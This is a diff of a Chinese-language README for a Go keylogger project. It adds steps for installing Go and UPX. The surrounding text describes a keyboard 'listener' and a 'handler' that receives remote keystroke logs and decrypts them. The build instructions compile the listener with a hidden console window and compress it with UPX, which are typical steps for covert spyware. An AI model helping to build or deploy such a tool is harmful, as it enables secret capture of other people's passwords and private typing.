@@ -1,4 +1,15 @@
-### listener
+### 一. 安装Go语言环境
+下载对应版本，例如windows64位: go1.13.5.windows-amd64.msi，就单纯编译这程序的话，全部默认下一步就好
+```
+https://studygolang.com/dl # 官网被墙，可以使用这个
+```
+### 二. 安装upx(可选)
+下载对应版本，例如windows64位: upx-3.95-win64.zip，是个二进制文件可执行文件免安装
+```
+https://github.com/upx/upx/releases/tag/v3.95
+```
+
+### 三. listener
 键盘监听程序
 
 #### 参数配置
@@ -58,7 +69,7 @@ $ go build -ldflags "-s -w -H windowsgui" -o keylistener.exe *.go
 $ upx -9 keylistener.exe
 ```
 
-### handler
+### 四. handler
 记录接收的远程端，也可以用于解密加密过的键盘记录文件
 
 ##### 1. 进入程序目录
